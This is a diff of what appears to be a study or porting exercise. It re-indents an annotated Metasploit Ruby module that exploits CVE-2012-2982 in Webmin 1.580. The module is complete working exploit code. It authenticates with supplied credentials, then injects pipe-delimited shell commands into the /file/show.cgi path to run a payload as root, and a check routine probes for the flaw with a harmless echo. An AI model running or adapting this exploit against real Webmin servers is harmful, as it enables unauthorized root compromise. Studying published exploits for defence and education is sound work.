@@ -107,186 +107,184 @@ Information to convert
 ### Module Code
 
     ```ruby
-    ##
-    # This module requires Metasploit: https://metasploit.com/download
-    # Current source: https://github.com/rapid7/metasploit-framework
-    ##
+      ##
+      # This module requires Metasploit: https://metasploit.com/download
+      # Current source: https://github.com/rapid7/metasploit-framework
+      ##
 
-    class MetasploitModule < Msf::Exploit::Remote
-      Rank = ExcellentRanking
+      class MetasploitModule < Msf::Exploit::Remote
+        Rank = ExcellentRanking
 
-      include Msf::Exploit::Remote::HttpClient
-    #########################
-    ## Initialize Function ##
-    #########################
-      def initialize(info = {})
-        # Description of the Exploit, authaorice and referenc sites 
-        super(
-          update_info(
-            info,
-            'Name' => 'Webmin /file/show.cgi Remote Command Execution',
-            'Description' => %q{
-              This module exploits an arbitrary command execution vulnerability in Webmin
-              1.580. The vulnerability exists in the /file/show.cgi component and allows an
-              authenticated user, with access to the File Manager Module, to execute arbitrary
-              commands with root privileges. The module has been tested successfully with Webmin
-              1.580 over Ubuntu 10.04.
-            },
-            'Author' => [
-              'Unknown', # From American Information Security Group
-              'juan vazquez' # Metasploit module
-            ],
-            'License' => MSF_LICENSE,
-            'References' => [
-              ['OSVDB', '85248'],
-              ['BID', '55446'],
-              ['CVE', '2012-2982'],
-              ['URL', 'http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf'],
-              ['URL', 'https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213']
-            ],
-            'Privileged' => true,
-            'Payload' => {
-              'DisableNops' => true,
-              # Maximum space in memory to store the payload
-              'Space' => 512,
-              'Compat' =>
-                            {
-                              # Ensures the payload the exploit uses is the 'cmd'
-                              'PayloadType' => 'cmd',
-                              'RequiredCmd' => 'generic perl ruby python telnet',
-                            }
-            },
-            'Platform' => 'unix',
-            'Arch' => ARCH_CMD,
-            'Targets' => [[ 'Webmin 1.580', {}]],
-            'DisclosureDate' => '2012-09-06',
-            'DefaultTarget' => 0,
-            'Notes' => {
-              'Reliability' => UNKNOWN_RELIABILITY,
-              'Stability' => UNKNOWN_STABILITY,
-              'SideEffects' => UNKNOWN_SIDE_EFFECTS
-            }
+        include Msf::Exploit::Remote::HttpClient
+      #########################
+      ## Initialize Function ##
+      #########################
+        def initialize(info = {})
+          # Description of the Exploit, authaorice and referenc sites 
+          super(
+            update_info(
+              info,
+              'Name' => 'Webmin /file/show.cgi Remote Command Execution',
+              'Description' => %q{
+                This module exploits an arbitrary command execution vulnerability in Webmin
+                1.580. The vulnerability exists in the /file/show.cgi component and allows an
+                authenticated user, with access to the File Manager Module, to execute arbitrary
+                commands with root privileges. The module has been tested successfully with Webmin
+                1.580 over Ubuntu 10.04.
+              },
+              'Author' => [
+                'Unknown', # From American Information Security Group
+                'juan vazquez' # Metasploit module
+              ],
+              'License' => MSF_LICENSE,
+              'References' => [
+                ['OSVDB', '85248'],
+                ['BID', '55446'],
+                ['CVE', '2012-2982'],
+                ['URL', 'http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf'],
+                ['URL', 'https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213']
+              ],
+              'Privileged' => true,
+              'Payload' => {
+                'DisableNops' => true,
+                # Maximum space in memory to store the payload
+                'Space' => 512,
+                'Compat' =>
+                              {
+                                # Ensures the payload the exploit uses is the 'cmd'
+                                'PayloadType' => 'cmd',
+                                'RequiredCmd' => 'generic perl ruby python telnet',
+                              }
+              },
+              'Platform' => 'unix',
+              'Arch' => ARCH_CMD,
+              'Targets' => [[ 'Webmin 1.580', {}]],
+              'DisclosureDate' => '2012-09-06',
+              'DefaultTarget' => 0,
+              'Notes' => {
+                'Reliability' => UNKNOWN_RELIABILITY,
+                'Stability' => UNKNOWN_STABILITY,
+                'SideEffects' => UNKNOWN_SIDE_EFFECTS
+              }
+            )
           )
-        )
 
-        register_options(
-          [
-            # Sets the target port
-            Opt::RPORT(10000),
-            # Whether  or not hte site uses HTTPS
-            OptBool.new('SSL', [true, 'Use SSL', true]),
-            # accepts the username
-            OptString.new('USERNAME', [true, 'Webmin Username']),
-            # accepts the password
-            OptString.new('PASSWORD', [true, 'Webmin Password'])
-          ]
-        )
-      end
-      ####################
-      ## Check Function ##
-      ####################
-      def check
-
-        # reserves space for the target IP and port, sets target IP and port 
-        peer = "#{rhost}:#{rport}"
-
-        vprint_status("Attempting to login...")
-        # Stores the URL that handles the login request, wbtains Webmin login page URI
-        data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"
-        # sends an HTTP POST request to login with the compromised credentials, Sends post request to the server
-        res = send_request_cgi(
-          {
-            'method' => 'POST',
-            'uri' => "/session_login.cgi",
-            'cookie' => "testing=1",
-            'data' => data
-          }, 25
-        )
-        
-        # If the HTTP response code is 302 and the cookie equals the value of the session ID (sid), then continue
-        if res and res.code == 302 and res.get_cookies =~ /sid/
-          vprint_good "Authentication successful"
-          # format the cookie into a readable string based on the Set-Cookie header in the HTTP respose, ready to accept excess text
-          session = res.get_cookies.split("sid=")[1].split(";")[0]
-        else
-          vprint_error "Service found, but authentication failed"
-          return Exploit::CheckCode::Detected
+          register_options(
+            [
+              # Sets the target port
+              Opt::RPORT(10000),
+              # Whether  or not hte site uses HTTPS
+              OptBool.new('SSL', [true, 'Use SSL', true]),
+              # accepts the username
+              OptString.new('USERNAME', [true, 'Webmin Username']),
+              # accepts the password
+              OptString.new('PASSWORD', [true, 'Webmin Password'])
+            ]
+          )
         end
+        ####################
+        ## Check Function ##
+        ####################
+        def check
 
-        vprint_status("Attempting to execute...")
-        # generate a random string of five alphanumeric charactesr to use as invalid input
-        command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"
+          # reserves space for the target IP and port, sets target IP and port 
+          peer = "#{rhost}:#{rport}"
 
-        # second request to verify vulnerability to the exploit
-        res = send_request_cgi(
-          {
-            'uri' => "/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
-            'cookie' => "sid=#{session}"
-          }, 25
-        )
+          vprint_status("Attempting to login...")
+          # Stores the URL that handles the login request, wbtains Webmin login page URI
+          data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"
+          # sends an HTTP POST request to login with the compromised credentials, Sends post request to the server
+          res = send_request_cgi(
+            {
+              'method' => 'POST',
+              'uri' => "/session_login.cgi",
+              'cookie' => "testing=1",
+              'data' => data
+            }, 25
+          )
+          
+          # If the HTTP response code is 302 and the cookie equals the value of the session ID (sid), then continue
+          if res and res.code == 302 and res.get_cookies =~ /sid/
+            vprint_good "Authentication successful"
+            # format the cookie into a readable string based on the Set-Cookie header in the HTTP respose, ready to accept excess text
+            session = res.get_cookies.split("sid=")[1].split(";")[0]
+          else
+            vprint_error "Service found, but authentication failed"
+            return Exploit::CheckCode::Detected
+          end
 
-        if res and res.code == 200 and res.message =~ /Document follows/
-          return Exploit::CheckCode::Vulnerable
-        else
-          return Exploit::CheckCode::Safe
+          vprint_status("Attempting to execute...")
+          # generate a random string of five alphanumeric charactesr to use as invalid input
+          command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"
+
+          # second request to verify vulnerability to the exploit
+          res = send_request_cgi(
+            {
+              'uri' => "/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
+              'cookie' => "sid=#{session}"
+            }, 25
+          )
+
+          if res and res.code == 200 and res.message =~ /Document follows/
+            return Exploit::CheckCode::Vulnerable
+          else
+            return Exploit::CheckCode::Safe
+          end
         end
-      end
+        ######################
+        ## Exploit Function ##
+        ######################
+        def exploit
+          peer = "#{rhost}:#{rport}"
 
-      ######################
-      ## Exploit Function ##
-      ######################
+          print_status("Attempting to login...")
 
-      def exploit
-        peer = "#{rhost}:#{rport}"
+          data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"
 
-        print_status("Attempting to login...")
+          res = send_request_cgi(
+            {
+              'method' => 'POST',
+              'uri' => "/session_login.cgi",
+              'cookie' => "testing=1",
+              'data' => data
+            }, 25
+          )
 
-        data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"
-
-        res = send_request_cgi(
-          {
-            'method' => 'POST',
-            'uri' => "/session_login.cgi",
-            'cookie' => "testing=1",
-            'data' => data
-          }, 25
-        )
-
-        if res and res.code == 302 and res.get_cookies =~ /sid/
-          session = res.get_cookies.scan(/sid\=(\w+)\;*/).flatten[0] || ''
-          if session and not session.empty?
+          if res and res.code == 302 and res.get_cookies =~ /sid/
+            session = res.get_cookies.scan(/sid\=(\w+)\;*/).flatten[0] || ''
+            if session and not session.empty?
+              print_good "Authentication successful"
+            else
+              print_error "Authentication failed"
+              return
+            end
             print_good "Authentication successful"
           else
             print_error "Authentication failed"
             return
           end
-          print_good "Authentication successful"
-        else
-          print_error "Authentication failed"
-          return
-        end
 
-        print_status("Attempting to execute the payload...")
-        # different from the check function. This performs URL encoding
-        command = payload.encoded
+          print_status("Attempting to execute the payload...")
+          # different from the check function. This performs URL encoding
+          command = payload.encoded
 
-        # second request does not specify the http method, defaults to GET
-        # 
-        res = send_request_cgi(
-          {
-            'uri' => "/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|",
-            'cookie' => "sid=#{session}"
-          }, 25
-        )
+          # second request does not specify the http method, defaults to GET
+          # 
+          res = send_request_cgi(
+            {
+              'uri' => "/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|",
+              'cookie' => "sid=#{session}"
+            }, 25
+          )
 
-        if res and res.code == 200 and res.message =~ /Document follows/
-          print_good "Payload executed successfully"
-        else
-          print_error "Error executing the payload"
-          return
+          if res and res.code == 200 and res.message =~ /Document follows/
+            print_good "Payload executed successfully"
+          else
+            print_error "Error executing the payload"
+            return
+          end
         end
       end
-    end
     ```
 
 ### All information Needing Converted to python
